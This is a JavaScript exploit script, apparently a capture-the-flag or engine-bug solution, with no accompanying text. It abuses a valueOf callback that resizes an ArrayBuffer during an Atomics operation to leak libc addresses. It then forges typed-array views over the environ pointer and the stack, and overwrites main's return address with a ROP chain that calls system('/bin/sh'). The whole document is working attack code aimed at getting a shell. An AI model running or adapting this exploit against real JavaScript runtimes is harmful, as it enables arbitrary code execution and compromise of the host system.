function is_stack_ptr(x) {
  return x >= 0x00007ff000000000n && x < 0x0000800000000000n;
}

const OFF_UNSORTED_FD = 0x1e7b20n;
const OFF_ENVIRON     = 0x1eee28n;
const OFF_MAIN_RETVAL = 0x29ca8n;

const OFF_SYSTEM      = 0x53110n;
const OFF_BINSH       = 0x1a7ea4n;
const OFF_POP_RDI_RET = 0x2a145n;
const OFF_RET         = 0x2846bn;
const OFF__EXIT       = 0xdd280n;

const BIG = 0x2000;
const BIG_MAX = 0x3000;

let keep = [];

// libc leak early
let leak_ab = new ArrayBuffer(BIG, { maxByteLength: BIG_MAX });
let leak_guard = new ArrayBuffer(0x2000);
keep.push(leak_ab, leak_guard);
let leak_ta = new BigInt64Array(leak_ab);
let leak = Atomics.add(leak_ta, 4, {
  valueOf() {
    leak_ab.resize(8);
    return 0n;
  }
});
let libc_base = leak - OFF_UNSORTED_FD;
let environ_addr = libc_base + OFF_ENVIRON;
let ret_value = libc_base + OFF_MAIN_RETVAL;

// heap grooming
for (let i = 0; i < 0x5000; i++) keep.push({ a: i });

let backing = new ArrayBuffer(0x10000);
(new BigUint64Array(backing)).fill(0n);
keep.push(backing);

function make_candidates(base) {
  let rab = new ArrayBuffer(BIG, { maxByteLength: BIG_MAX });
  let guard = new ArrayBuffer(0x2000);
  keep.push(rab, guard);
  let ta = new BigInt64Array(rab);
  let cands = [];
  Atomics.store(ta, 11, {
    valueOf() {
      rab.resize(8);
      for (let i = 0; i < 0x800; i++) cands.push(new BigUint64Array(backing));
      return base;
    }
  });
  keep.push(cands);
  return cands;
}

function try_get_environ_view() {
  let cands = make_candidates(environ_addr);
  for (let c of cands) {
    if (is_stack_ptr(c[0])) return c;
  }
  return null;
}

function try_get_stack_view(stack_base, idx_env) {
  let cands = make_candidates(stack_base);
  for (let c of cands) {
    let v0 = c[idx_env];
    let v1 = c[idx_env + 1];
    if (is_stack_ptr(v0) && is_stack_ptr(v1)) return c;
  }
  return null;
}

let env_view = null;
for (let i = 0; i < 12; i++) {
  env_view = try_get_environ_view();
  if (env_view) break;
}
if (!env_view) throw new Error('no environ view');
keep.push(env_view);
let env_ptr = env_view[0];

let stack_base = env_ptr - 0x8000n;
let idx_env = Number((env_ptr - stack_base) / 8n);
let stack_view = null;
for (let i = 0; i < 12; i++) {
  stack_view = try_get_stack_view(stack_base, idx_env);
  if (stack_view) break;
}
if (!stack_view) throw new Error('no stack view');
keep.push(stack_view);

let chain = [
  libc_base + OFF_RET,
  libc_base + OFF_POP_RDI_RET,
  libc_base + OFF_BINSH,
  libc_base + OFF_SYSTEM,
  libc_base + OFF_POP_RDI_RET,
  0n,
  libc_base + OFF__EXIT,
];

// Main return address is very close to env_ptr, so find a match near idx_env.
let slot = -1;
let start = idx_env - 0x100; // search last 0x100 qwords (0x800 bytes)
if (start < 0) start = 0;
for (let i = idx_env - 1; i >= start; i--) {
  if (stack_view[i] === ret_value) {
    slot = i;
    break;
  }
}
if (slot === -1) throw new Error('no main ret slot');

for (let j = 0; j < chain.length; j++) {
  stack_view[slot + j] = chain[j];
}
